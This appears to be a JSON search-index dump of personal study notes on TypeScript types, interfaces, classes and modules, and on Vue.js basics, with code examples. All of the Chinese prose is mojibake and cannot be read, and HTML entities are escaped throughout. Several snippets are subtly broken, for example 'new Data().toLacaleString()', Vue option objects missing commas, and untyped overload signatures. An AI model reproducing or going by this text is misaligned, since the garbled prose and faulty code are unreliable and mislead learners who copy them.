å¯ä»¥ä½¿ç”¨ anyã€‚\n  å®ƒä¹‹æ‰€ä»¥ä¸è¢«ç§°ä¸ºç±»å‹è½¬æ¢ï¼Œæ˜¯å› ä¸ºè½¬æ¢é€šå¸¸æ„å‘³ç€æŸç§è¿è¡Œæ—¶çš„æ”¯æŒã€‚ä½†æ˜¯ï¼Œç±»å‹æ–­è¨€çº¯ç²¹æ˜¯ä¸€ä¸ªç¼–è¯‘æ—¶è¯­æ³•ï¼ŒåŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§ä¸ºç¼–è¯‘å™¨æä¾›å…³äºå¦‚ä½•åˆ†æä»£ç çš„æ–¹æ³•ã€‚\n  ç±»å‹æ¨æ–­ï¼ˆC++ ä¸­çš„ autoï¼‰ï¼šä½¿ç”¨ var å…³é”®å­—ã€‚\nAny ç±»å‹ #  ä»»æ„å€¼æ˜¯ TypeScript é’ˆå¯¹ç¼–ç¨‹æ—¶ç±»å‹ä¸æ˜ç¡®çš„å˜é‡ä½¿ç”¨çš„ä¸€ç§æ•°æ®ç±»å‹ï¼Œç±»å‹æ ¸å¿ƒåœ¨äºä¸åœ¨ç¼–è¯‘æ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚\nlet x: any = 1; x = \u0026#39;I am who I am\u0026#39;; // æ­£ç¡®ï¼ŒAny å¯ä»¥æŒ‡å‘ä»»æ„ç±»å‹  x.ifItExists(); // æ­£ç¡®ï¼ŒifItExistsæ–¹æ³•åœ¨è¿è¡Œæ—¶å¯èƒ½å­˜åœ¨ï¼Œä½†è¿™é‡Œå¹¶ä¸ä¼šæ£€æŸ¥  let arrayList: any[] = [1, false, \u0026#39;fine\u0026#39;]; arrayList[1] = 100;\t// æ­£ç¡®ï¼Œæ•°ç»„å†…å®¹æ˜¯ Any ç±»å‹ void/null/undefined/never #  voidï¼š\n ç”¨äºæ ‡è¯†æ–¹æ³•è¿”å›å€¼çš„ç±»å‹ï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚  nullï¼š\n  åœ¨ JavaScript ä¸­ null è¡¨ç¤º \u0026ldquo;ä»€ä¹ˆéƒ½æ²¡æœ‰\u0026rdquo;ã€‚\n  null æ˜¯ä¸€ä¸ªåªæœ‰ä¸€ä¸ªå€¼çš„ç‰¹æ®Šç±»å‹ã€‚è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡å¼•ç”¨ã€‚\n  typeof null === 'object'\n  undefinedï¼š\n åœ¨ JavaScript ä¸­ï¼Œundefined æ˜¯ä¸€ä¸ªæ²¡æœ‰è®¾ç½®å€¼çš„å˜é‡ã€‚ typeof ä¸€ä¸ªæ²¡æœ‰å€¼çš„å˜é‡ä¼šè¿”å› undefinedã€‚ null å’Œ undefined æ˜¯å…¶ä»–ä»»ä½•ç±»å‹ï¼ˆåŒ…æ‹¬ voidï¼‰çš„å­ç±»å‹ï¼Œå¯ä»¥èµ‹å€¼ç»™å…¶å®ƒç±»å‹ï¼Œå¦‚æ•°å­—ç±»å‹ï¼Œæ­¤æ—¶ï¼Œèµ‹å€¼åçš„ç±»å‹ä¼šå˜æˆ null æˆ– undefinedã€‚ è€Œåœ¨ TypeScript ä¸­å¯ç”¨ä¸¥æ ¼çš„ç©ºæ ¡éªŒç‰¹æ€§ï¼Œå°±å¯ä»¥ä½¿å¾— null å’Œ undefined åªèƒ½è¢«èµ‹å€¼ç»™ void æˆ–æœ¬èº«å¯¹åº”çš„ç±»å‹ã€‚  neverï¼š\n never æ˜¯å…¶å®ƒç±»å‹ï¼ˆåŒ…æ‹¬ null å’Œ undefinedï¼‰çš„å­ç±»å‹ï¼Œä»£è¡¨ä»ä¸ä¼šå‡ºç°çš„å€¼ã€‚ è¿™æ„å‘³ç€å£°æ˜ä¸º never ç±»å‹çš„å˜é‡åªèƒ½è¢« never ç±»å‹æ‰€èµ‹å€¼ï¼Œåœ¨å‡½æ•°ä¸­å®ƒé€šå¸¸è¡¨ç°ä¸ºæŠ›å‡ºå¼‚å¸¸æˆ–æ— æ³•æ‰§è¡Œåˆ°ç»ˆæ­¢ç‚¹çš„å‡½æ•°ï¼›  "},{"id":96,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/2.%E6%8E%A7%E5%88%B6%E6%B5%81/","title":"2.æ§åˆ¶æµ","section":"èœé¸Ÿæ•™ç¨‹","content":"æ§åˆ¶æµ #  æ¡ä»¶åˆ¤æ–­ #  å¾ªç¯ #  å‡½æ•° #  å‚æ•°ç±»å‹ #  å‡½æ•°å¯ä»¥æŒ‡å®šè¿”å›å€¼ç±»å‹ä¸å‚æ•°ç±»å‹ï¼Œæ¯”å¦‚ï¼š\nfunction add(x: number, y: number): string {  // ... }  ä¸Šé¢å®šä¹‰çš„æ˜¯ä¸¤ä¸ª number ç±»å‹ä¸ºå‚æ•°ï¼Œä¸€ä¸ª string ç±»å‹ä¸ºè¿”å›å€¼çš„å‡½æ•°ã€‚  å‡½æ•°é‡è½½ #  å¯ä»¥é€šè¿‡å‚æ•°ç±»å‹å¯¹ç›¸åŒå‡½æ•°åè¿›è¡Œé‡ï¼š\nfunction disp(string):void; function disp(number):void; "},{"id":97,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/3.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/","title":"3.å†…ç½®ç±»å‹","section":"èœé¸Ÿæ•™ç¨‹","content":"å†…ç½®ç±»å‹ #  Number #  æ¦‚è¿° #  TypeScript ä¸ JavaScript ç±»ä¼¼ï¼Œæ”¯æŒ Number å¯¹è±¡ã€‚Number å¯¹è±¡æ˜¯åŸå§‹æ•°å€¼çš„åŒ…è£…å¯¹è±¡ã€‚\nå¯¹è±¡å±æ€§ #  Number å¯¹è±¡æ”¯æŒçš„å±æ€§ï¼š\n MAX_VALUEã€MIN_VALUEã€NaNã€NEGATIVE_INFINITYã€POSITIVE_INFINITY prototypeã€constructorï¼›  å¯¹è±¡æ–¹æ³• #     åºå· æ–¹æ³• \u0026amp; æè¿°     1. toExponential()ï¼šæŠŠå¯¹è±¡çš„å€¼è½¬æ¢ä¸ºæŒ‡æ•°è®¡æ•°æ³•ã€‚   2. toFixed()ï¼šæŠŠæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å¯¹å°æ•°ç‚¹æŒ‡å®šä½æ•°ã€‚   3. toLocaleString()ï¼šæŠŠæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä½¿ç”¨æœ¬åœ°æ•°å­—æ ¼å¼é¡ºåºã€‚   4. toPrecision()ï¼šæŠŠæ•°å­—æ ¼å¼åŒ–ä¸ºæŒ‡å®šçš„é•¿åº¦ã€‚   5. toString()ï¼šæŠŠæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä½¿ç”¨æŒ‡å®šçš„åŸºæ•°ã€‚æ•°å­—çš„åŸºæ•°æ˜¯ 2 ~ 36 ä¹‹é—´çš„æ•´æ•°ã€‚è‹¥çœç•¥è¯¥å‚æ•°ï¼Œåˆ™ä½¿ç”¨åŸºæ•° 10ã€‚   6. valueOf()ï¼šè¿”å›ä¸€ä¸ª Number å¯¹è±¡çš„åŸå§‹æ•°å­—å€¼ã€‚    String #  å¯¹è±¡å±æ€§ #  String å¯¹è±¡æ”¯æŒçš„å±æ€§ï¼š\n length è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼› constructorã€prototypeï¼›  å¯¹è±¡æ–¹æ³• #  è§ï¼šhttps://www.runoob.com/typescript/ts-string.html\nArray #  æ„é€  #  Array å¯¹è±¡çš„æ„é€ å‡½æ•°æ¥å—ä»¥ä¸‹ä¸¤ç§å€¼ï¼š\n è¡¨ç¤ºæ•°ç»„å¤§å°çš„æ•°å€¼ã€‚ åˆå§‹åŒ–çš„æ•°ç»„åˆ—è¡¨ï¼Œå…ƒç´ ä½¿ç”¨é€—å·åˆ†éš”å€¼ã€‚  ä¾‹å­ï¼š\nvar arr_names:number[] = new Array(4); var sites:string[] = new Array(\u0026#34;Google\u0026#34;,\u0026#34;Runoob\u0026#34;,\u0026#34;Taobao\u0026#34;,\u0026#34;Facebook\u0026#34;) æ•°ç»„æ–¹æ³• #  è§ï¼šhttps://www.runoob.com/typescript/ts-array.html\nMap #  ç±»å‹å£°æ˜ï¼šå¯ä»¥ä½¿ç”¨ Record\u0026lt;Type1, Type2\u0026gt;ï¼›\nå…ƒç»„ #  æˆ‘ä»¬çŸ¥é“æ•°ç»„ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹éƒ½ä¸€èˆ¬æ˜¯ç›¸åŒçš„ï¼ˆany[] ç±»å‹çš„æ•°ç»„å¯ä»¥ä¸åŒï¼‰ï¼Œå¦‚æœå­˜å‚¨çš„å…ƒç´ æ•°æ®ç±»å‹ä¸åŒï¼Œåˆ™éœ€è¦ä½¿ç”¨å…ƒç»„ã€‚\nå…ƒç»„ä¸­å…è®¸å­˜å‚¨ä¸åŒç±»å‹çš„å…ƒç´ ï¼Œå…ƒç»„å¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚\nåˆ›å»ºå…ƒç»„çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\nvar tuple_name = [value1,value2,value3,â€¦valuen] å…ƒç»„çš„ç±»å‹å£°æ˜ã€‚\næ¯”å¦‚ä¸€ä¸ª number ç±»å‹å’Œä¸€ä¸ª string ç±»å‹ä½œä¸ºå…ƒç»„ï¼š\nvar tup : [number, string] = [1, \u0026#39;h\u0026#39;]; è”åˆç±»å‹ #  åˆ›å»ºè”åˆç±»å‹çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\nType1|Type2|Type3 è”åˆç±»å‹å‘å•ä¸ªç±»å‹çš„è½¬åŒ–å¯ä»¥ä½¿ç”¨ as å…³é”®å­—ã€‚\næšä¸¾ #  æšä¸¾çš„å®šä¹‰ä½¿ç”¨ enum å…³é”®è¯ã€‚\nä¾‹å­ï¼š\nenum Direction {  Up = 1, Down, Left, Right } "},{"id":98,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/4.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","title":"4.é¢å‘å¯¹è±¡","section":"èœé¸Ÿæ•™ç¨‹","content":"é¢å‘å¯¹è±¡ #  æ¥å£ #  TypeScript æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š\ninterface RunOptions {  program:string;  commandline:string[]|string|(()=\u0026gt;string); } åœ¨ Interface ä¸­å®šä¹‰æ–¹æ³•ï¼š\ninterface IEmployee {  getSalary: (number) =\u0026gt; number; // arrow function  getManagerName(number): string; } Interface å¯ä»¥å®šä¹‰æ–¹æ³•ç±»å‹ã€‚\nç»§æ‰¿ä½¿ç”¨å…³é”®å­— extendsï¼Œå•æ¥å£ç»§æ‰¿è¯­æ³•æ ¼å¼ï¼š\nChild_interface_name extends super_interface_name å¤šæ¥å£ç»§æ‰¿è¯­æ³•æ ¼å¼ï¼š\nChild_interface_name extends super_interface1_name, super_interface2_name,â€¦,super_interfaceN_name ç±» #  å®šä¹‰ç±»çš„å…³é”®å­—ä¸º classï¼Œåé¢ç´§è·Ÿç±»åï¼Œç±»å¯ä»¥åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ¨¡å—ï¼ˆç±»çš„æ•°æ®æˆå‘˜ï¼‰ï¼š\n å­—æ®µï¼šå­—æ®µæ˜¯ç±»é‡Œé¢å£°æ˜çš„å˜é‡ã€‚å­—æ®µè¡¨ç¤ºå¯¹è±¡çš„æœ‰å…³æ•°æ®ã€‚ æ„é€ å‡½æ•°ï¼šç±»å®ä¾‹åŒ–æ—¶è°ƒç”¨ï¼Œå¯ä»¥ä¸ºç±»çš„å¯¹è±¡åˆ†é…å†…å­˜ã€‚ æ–¹æ³•ï¼šæ–¹æ³•ä¸ºå¯¹è±¡è¦æ‰§è¡Œçš„æ“ä½œã€‚  æ¯”å¦‚ï¼š\nclass Car {  // å­—æ®µ  engine:string;   // æ„é€ å‡½æ•°  constructor(engine:string) {  this.engine = engine  }   // æ–¹æ³•  disp():void {  console.log(\u0026#34;å‡½æ•°ä¸­æ˜¾ç¤ºå‘åŠ¨æœºå‹å· : \u0026#34;+this.engine)  } } ç±»ä¸èƒ½ç›´æ¥å¯¹å¤–æš´éœ²ï¼Œéœ€è¦é€šè¿‡å®ç°ä¸€ä¸ªæ¥å£ï¼Œå¤–éƒ¨é€šè¿‡æ¥å£è°ƒç”¨ã€‚\nå¯¹è±¡ #  æ³›å‹ #  "},{"id":99,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/5.%E6%A8%A1%E5%9D%97/","title":"5.æ¨¡å—","section":"èœé¸Ÿæ•™ç¨‹","content":"æ¨¡å— #  å¯¼å‡ºæ¨¡å— #  æ¨¡å—å¯¼å‡ºä½¿ç”¨å…³é”®å­— export å…³é”®å­—ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n// SomeInterface.ts export interface SomeInterface {  // ä»£ç éƒ¨åˆ† } è¦åœ¨å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨è¯¥æ¨¡å—å°±éœ€è¦ä½¿ç”¨ import å…³é”®å­—æ¥å¯¼å…¥:\nimport someInterfaceRef = require(\u0026#34;./SomeInterface\u0026#34;); å£°æ˜æ–‡ä»¶ #  å¸¸è§åˆ°çš„ .d.ts ç»“å°¾çš„æ–‡ä»¶å°±æ˜¯å£°æ˜æ–‡ä»¶ã€‚\nåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ä½¿ç”¨ export module è¯­æ³•æˆ–è€… export namespace è¯­æ³•ï¼Œåœ¨é¡¹ç›®çš„å…¶ä»–åœ°æ–¹è¿›è¡Œå¼•ç”¨æ—¶ï¼Œå°±å¯ä»¥ä¸éœ€è¦å¼•ç”¨å®Œæ•´è·¯å¾„è¿›è¡Œå¼•ç”¨ï¼Œæ¯”å¦‚ï¼š\n// dec.d.ts declare module \u0026#34;Dec\u0026#34; // ref.ts import * as des from \u0026#34;Dec\u0026#34;; TypeScript ä½œä¸º JavaScript çš„è¶…é›†ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ä¸å¯é¿å…è¦å¼•ç”¨å…¶ä»–ç¬¬ä¸‰æ–¹çš„ JavaScript çš„åº“ã€‚è™½ç„¶é€šè¿‡ç›´æ¥å¼•ç”¨å¯ä»¥è°ƒç”¨åº“çš„ç±»å’Œæ–¹æ³•ï¼Œä½†æ˜¯å´æ— æ³•ä½¿ç”¨TypeScript è¯¸å¦‚ç±»å‹æ£€æŸ¥ç­‰ç‰¹æ€§åŠŸèƒ½ã€‚\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†è¿™äº›åº“é‡Œçš„å‡½æ•°å’Œæ–¹æ³•ä½“å»æ‰ååªä¿ç•™å¯¼å‡ºç±»å‹å£°æ˜ï¼Œè€Œäº§ç”Ÿäº†ä¸€ä¸ªæè¿° JavaScript åº“å’Œæ¨¡å—ä¿¡æ¯çš„å£°æ˜æ–‡ä»¶ã€‚é€šè¿‡å¼•ç”¨è¿™ä¸ªå£°æ˜æ–‡ä»¶ï¼Œå°±å¯ä»¥å€Ÿç”¨ TypeScript çš„å„ç§ç‰¹æ€§æ¥ä½¿ç”¨åº“æ–‡ä»¶äº†ã€‚\næ¯”å¦‚ä½¿ç”¨ jQueryï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ declare å…³é”®å­—æ¥å®šä¹‰å®ƒçš„ç±»å‹ï¼Œå¸®åŠ© TypeScript åˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ç±»å‹å¯¹ä¸å¯¹ï¼š\ndeclare var jQuery: (selector: string) =\u0026gt; any;  jQuery(\u0026#39;#foo\u0026#39;); declare å®šä¹‰çš„ç±»å‹åªä¼šç”¨äºç¼–è¯‘æ—¶çš„æ£€æŸ¥ï¼Œç¼–è¯‘ç»“æœä¸­ä¼šè¢«åˆ é™¤ã€‚\n"},{"id":100,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/vuejs/%E5%9F%BA%E7%A1%80/","title":"åŸºç¡€","section":"vuejs","content":"åŸºç¡€ #  ä»‹ç» #  èµ·æ­¥ HelloWorld #  æœ€ç®€å•çš„æ–¹å¼æ˜¯å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„ä¾‹å­ï¼š\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;  \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;  \u0026lt;p\u0026gt;{{ message }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; new Vue({  el: \u0026#39;#app\u0026#39;,  data: {  message: \u0026#39;Hello Vue.js!\u0026#39;  } }) å£°æ˜å¼æ¸²æŸ“ #  æ•°æ®å’Œ DOM å»ºç«‹çš„è¿æ¥éƒ½æ˜¯å“åº”å¼çš„ â†’ æ‰“å¼€æµè§ˆå™¨çš„ JavaScript æ§åˆ¶å°ï¼Œä¿®æ”¹ app.message çš„å€¼ï¼ŒDOM çš„å†…å®¹ä¼šç«‹å³å“åº”ã€‚é™¤äº†ç»‘å®šæ–‡æœ¬ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åƒå¦‚ä¸‹æ–¹å¼ç»‘å®šå…ƒç´ ç‰¹æ€§ï¼š\n\u0026lt;div id=\u0026#34;app-2\u0026#34;\u0026gt;  \u0026lt;span v-bind:title=\u0026#34;message\u0026#34;\u0026gt;  é¼ æ ‡æ‚¬åœå‡ ç§’é’ŸæŸ¥çœ‹æ­¤å¤„åŠ¨æ€ç»‘å®šçš„ä¿¡æ¯ã€‚  \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; var app2 = new Vue({  el: \u0026#34;#app-2\u0026#34;  data: {  message: \u0026#34;é¡µé¢åŠ è½½äº\u0026#34; + new Data().toLacaleString() \t} }) åœ¨ html ä¸­çš„ v-bind è¢«ç§°ä¸ºæŒ‡ä»¤ï¼Œå…¶ä¸­ v- è¡¨ç¤ºè¿™æ˜¯ Vue æä¾›çš„ç‰¹æ®Šç‰¹æ€§ï¼Œbind ä¸ºç»‘å®šå±æ€§çš„æ„æ€ã€‚åœ¨è¿™é‡Œï¼Œè¯¥æŒ‡ä»¤çš„æ„æ€æ˜¯ï¼šå°†è¿™ä¸ªå…ƒç´ èŠ‚ç‚¹çš„ title ç‰¹æ€§å’Œ Vue å®ä¾‹çš„ message å±æ€§ä¿æŒä¸€è‡´ã€‚\næ¡ä»¶ä¸å¾ªç¯ #  ä½¿ç”¨ v-if æŒ‡ä»¤å¯ä»¥è¿›è¡Œæ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚ä»¥ä¸‹çš„ä¾‹å­ï¼š\n\u0026lt;div id=\u0026#34;app-3\u0026#34;\u0026gt;  \u0026lt;p v-if=\u0026#34;seen\u0026#34;\u0026gt;  ç°åœ¨ä½ çœ‹åˆ°æˆ‘äº†  \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; var app3 = new Vue({  el: \u0026#34;#app-3\u0026#34;  data: {  seen: true \t} }) ä½¿ç”¨ v-for æŒ‡ä»¤å¯ä»¥ç”¨æ¥ç»‘å®šæ•°ç»„çš„æ•°æ®æ¥æ¸²æŸ“ä¸€ä¸ªé¡¹ç›®åˆ—è¡¨ï¼š\n\u0026lt;div id=\u0026#34;app-4\u0026#34;\u0026gt;  \u0026lt;ol\u0026gt;  \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34;\u0026gt;  {{ todo.text }}  \u0026lt;/li\u0026gt;  \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; var app4 = new Vue({  el: \u0026#34;#app-4\u0026#34;,  data: {  todos: [  {text: \u0026#34;å­¦ä¹  JavaScript\u0026#34;}  {text: \u0026#34;å­¦ä¹  Vue\u0026#34;}  {text: \u0026#34;å­¦ä¹  html\u0026#34;}  ]  } }) å¤„ç†ç”¨æˆ·è¾“å…¥ #  å¯ä»¥ä½¿ç”¨ v-on æŒ‡ä»¤æ·»åŠ ä¸€ä¸ªäº‹ä»¶ç›‘å¬å™¨ï¼Œé€šè¿‡è¯¥äº‹ä»¶ç›‘å¬å™¨è°ƒç”¨åœ¨ Vue å®ä¾‹ä¸­å®šä¹‰çš„æ–¹æ³•ï¼š\n\u0026lt;div id=\u0026#34;app-5\u0026#34;\u0026gt;  \u0026lt;p\u0026gt;  {{ message }}  \u0026lt;/p\u0026gt;  \u0026lt;button v-on:click=\u0026#34;reverseMessage\u0026#34;\u0026gt;  é€†è½¬æ¶ˆæ¯  \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; var app5 = new Vue({  el: \u0026#34;#app-5\u0026#34;,  data: {  message: \u0026#34;Hellow Vue.js!\u0026#34;  },  methods: {  reverseMessage: function(){  this.message = this.message.split(\u0026#39;\u0026#39;).reverse().join(\u0026#39;\u0026#39;) \t} \t} }) Vue è¿˜æä¾›äº† v-model æŒ‡ä»¤ï¼Œå®ƒèƒ½è½»æ¾å®ç°è¡¨å•è¾“å…¥å’Œåº”ç”¨çŠ¶æ€ä¹‹é—´çš„åŒå‘ç»‘å®šï¼Œæ¯”å¦‚ä»¥ä¸‹çš„ä¾‹å­ï¼š\n\u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;  \u0026lt;p\u0026gt;{{ message }}\u0026lt;/p\u0026gt;  \u0026lt;input v-model=\u0026#34;message\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; new Vue({  el: \u0026#39;#app\u0026#39;,  data: {  message: \u0026#39;Hello Vue.js!\u0026#39;  } }) ç»„ä»¶åŒ–åº”ç”¨æ¶æ„ #  åœ¨ Vue é‡Œï¼Œä¸€ä¸ªç»„ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ‹¥æœ‰é¢„å®šä¹‰é€‰é¡¹çš„ä¸€ä¸ª Vue å®ä¾‹ã€‚æ¯”å¦‚ä»¥ä¸‹çš„ä¾‹å­å®šä¹‰äº†ä¸€ä¸ª todo-item çš„ç»„ä»¶ï¼Œå…è®¸æˆ‘ä»¬åœ¨ html ä¸­ä½¿ç”¨ï¼š\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;  \u0026lt;div id=\u0026#34;app-7\u0026#34;\u0026gt;  \u0026lt;ol\u0026gt;  \u0026lt;todo-item  v-for = \u0026#34;item in groceryList\u0026#34;  v-bind:todo = \u0026#34;item\u0026#34;  v-bind:key = \u0026#34;item.id\u0026#34;\u0026gt;  \u0026lt;/todo-item\u0026gt;  \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; å…¶ä¸­ï¼Œhtml æ–‡ä»¶ä¸­ä½¿ç”¨äº† todo-item è¿™ä¸ªç»„ä»¶ï¼Œä½¿ç”¨ä»¥ä¸‹çš„ javascript æ–‡ä»¶å®šä¹‰ï¼š\nVue.component(\u0026#34;todo-item\u0026#34;, { \tprops: [\u0026#34;todo\u0026#34;],  template: \u0026#34;\u0026lt;li\u0026gt;{{ todo.text }}\u0026lt;/li\u0026gt;\u0026#34; })  var app7 = new Vue({  el: \u0026#39;#app-7\u0026#39;,  data: {  groceryList: [  { id: 0, text: \u0026#39;è”¬èœ\u0026#39; },  { id: 1, text: \u0026#39;å¥¶é…ª\u0026#39; },  { id: 2, text: \u0026#39;éšä¾¿å…¶å®ƒä»€ä¹ˆäººåƒçš„ä¸œè¥¿\u0026#39; }  ]  } }) PostScriptï¼šç»„ä»¶ä¸è‡ªå®šä¹‰å…ƒç´ çš„å…³ç³»ï¼š\n Web ç»„ä»¶è§„èŒƒä»ç„¶å¤„äºè‰æ¡ˆé˜¶æ®µï¼Œå¹¶ä¸”æœªè¢«æ‰€æœ‰æµè§ˆå™¨åŸç”Ÿå®ç°ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒVue ç»„ä»¶ä¸éœ€è¦ä»»ä½• polyfillï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰æ”¯æŒçš„æµè§ˆå™¨ (IE9 åŠæ›´é«˜ç‰ˆæœ¬) ä¹‹ä¸‹è¡¨ç°ä¸€è‡´ã€‚å¿…è¦æ—¶ï¼ŒVue ç»„ä»¶ä¹Ÿå¯ä»¥åŒ…è£…äºåŸç”Ÿè‡ªå®šä¹‰å…ƒç´ ä¹‹å†…ã€‚ Vue ç»„ä»¶æä¾›äº†çº¯è‡ªå®šä¹‰å…ƒç´ æ‰€ä¸å…·å¤‡çš„ä¸€äº›é‡è¦åŠŸèƒ½ï¼Œæœ€çªå‡ºçš„æ˜¯è·¨ç»„ä»¶æ•°æ®æµã€è‡ªå®šä¹‰äº‹ä»¶é€šä¿¡ä»¥åŠæ„å»ºå·¥å…·é›†æˆã€‚  Vue å®ä¾‹ #  æ¯ä¸ª Vue åº”ç”¨éƒ½æ˜¯é€šè¿‡ç”¨ Vue å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ Vue å®ä¾‹å¼€å§‹çš„ã€‚Vue çš„ API æ–‡æ¡£ã€‚\næ•°æ®ä¸æ–¹æ³• #  å½“ä¸€ä¸ª Vue å®ä¾‹è¢«åˆ›å»ºæ—¶ï¼Œå®ƒå‘ Vue çš„å“åº”å¼ç³»ç»Ÿä¸­åŠ å…¥äº†å…¶ data å¯¹è±¡ä¸­èƒ½æ‰¾åˆ°çš„æ‰€æœ‰çš„å±æ€§ã€‚\nå½“è¿™äº›æ•°æ®æ”¹å˜æ—¶ï¼Œè§†å›¾ä¼šè¿›è¡Œé‡æ¸²æŸ“ â†’ å€¼å¾—æ³¨æ„çš„æ˜¯åªæœ‰å½“å®ä¾‹è¢«åˆ›å»ºæ—¶ data ä¸­å­˜åœ¨çš„å±æ€§æ‰æ˜¯å“åº”å¼çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæ·»åŠ ä¸€ä¸ªæ–°çš„å±æ€§ï¼Œå°†ä¸ä¼šè§¦å‘ä»»ä½•è§†å›¾çš„æ›´æ–°ï¼‰ã€‚\nè¿™é‡Œå”¯ä¸€çš„ä¾‹å¤–æ˜¯ä½¿ç”¨ Object.freeze()ï¼Œè¿™ä¼šé˜»æ­¢ä¿®æ”¹ç°æœ‰çš„å±æ€§ï¼Œä¹Ÿæ„å‘³ç€å“åº”ç³»ç»Ÿæ— æ³•å†è¿½è¸ªå˜åŒ–ã€‚æ¯”å¦‚ä»¥ä¸‹çš„ä¾‹å­ï¼š\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;  \u0026lt;div id=\u0026#34;app-8\u0026#34;\u0026gt;  \u0026lt;p\u0026gt;{{ foo }}\u0026lt;/p\u0026gt;  \u0026lt;button v-on:click=\u0026#34;foo = \u0026#39;text\u0026#39;\u0026#34;\u0026gt;Change Text\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; var obj = { foo: \u0026#34;bar\u0026#34; } Object.freeze(obj)  var app8 = new Vue({ \tel: \u0026#34;#app-8\u0026#34;,  data: obj, }) é™¤äº†æ•°æ®å±æ€§ï¼ŒVue å®ä¾‹è¿˜æš´éœ²äº†ä¸€äº›æœ‰ç”¨çš„å®ä¾‹å±æ€§ä¸æ–¹æ³•ã€‚å®ƒä»¬éƒ½æœ‰å‰ç¼€ $ï¼Œä»¥ä¾¿ä¸ç”¨æˆ·å®šä¹‰çš„å±æ€§åŒºåˆ†å¼€æ¥ã€‚æ¯”å¦‚ï¼švm.$data $$\\Leftrightarrow$$ dataï¼ˆå…¶ä¸­ vm æ˜¯ä¸€ä¸ª Vue çš„å®ä¾‹ï¼‰\nå®ä¾‹ç”Ÿå‘½å‘¨æœŸé’©å­ #  æ¯ä¸ª Vue å®ä¾‹åœ¨è¢«åˆ›å»ºæ—¶éƒ½è¦ç»è¿‡ä¸€ç³»åˆ—åˆå§‹åŒ–çš„çš„è¿‡ç¨‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šè¿è¡Œä¸€äº›å«åšç”Ÿå‘½å‘¨æœŸé’©å­çš„å‡½æ•°ï¼Œè¿™ç»™äº†ç”¨æˆ·åœ¨ä¸åŒé˜¶æ®µæ·»åŠ è‡ªå·±çš„ä»£ç çš„æœºä¼šã€‚\næ¯”å¦‚ create é’©å­å¯ä»¥ç”¨æ¥åœ¨ä¸€ä¸ªå®ä¾‹è¢«åˆ›å»ºåæ‰§è¡Œä»£ç ï¼š\nnew Vue({  data: {  a: 1  },  created: function () {  // `this` æŒ‡å‘ vm å®ä¾‹  console.log(\u0026#39;a is: \u0026#39; + this.a)  } }) 